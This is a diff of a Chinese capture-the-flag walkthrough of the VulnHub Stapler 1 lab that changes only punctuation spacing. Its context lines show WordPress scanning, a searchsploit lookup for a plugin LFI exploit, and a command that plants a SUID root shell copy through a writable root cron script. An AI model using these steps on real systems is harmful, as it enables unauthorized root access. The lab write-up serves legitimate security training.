@@ -273,7 +273,7 @@ wpscan --url https://192.168.153.147:12380/blogblog/ --enumerate ap --plugins-de
 
 ## Advanced Video 插件 LFI 漏洞利用
 
-针对 WordPress 插件，可使用 searchsploit 工具搜索相关漏洞利用脚本。通过搜索插件名，发现 **Advanced Video 插件存在 [LFI 本地文件包含漏洞（EDB-ID 39646）](https://www.exploit-db.com/exploits/39646)**，并将其 EXP 脚本复制到当前目录：
+针对 WordPress 插件，可使用 searchsploit 工具搜索相关漏洞利用脚本。通过搜索插件名，发现 **Advanced Video 插件存在 [LFI 本地文件包含漏洞（EDB-ID 39646）](https://www.exploit-db.com/exploits/39646)** ，并将其 EXP 脚本复制到当前目录：
 
 ```bash
 searchsploit advanced video
@@ -470,7 +470,7 @@ ls -alh /etc/*cron*
 
 ![ls-cron-logrotate](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/ls-cron-logrotate.png)
 
-接下来设置计划任务，将 /bin/bash 文件复制为 **/tmp/getroot** 文件，将其属主改为 **`root:root`**，并赋予 SUID 权限 **`-rwsr-xr-x`**：
+接下来设置计划任务，将 /bin/bash 文件复制为 **/tmp/getroot** 文件，将其属主改为 **`root:root`** ，并赋予 SUID 权限 **`-rwsr-xr-x`** ：
 
 ```bash
 echo "cp /bin/bash /tmp/getroot; chown root:root /tmp/getroot; chmod u+s /tmp/getroot" >> /usr/local/sbin/cron-logrotate.sh
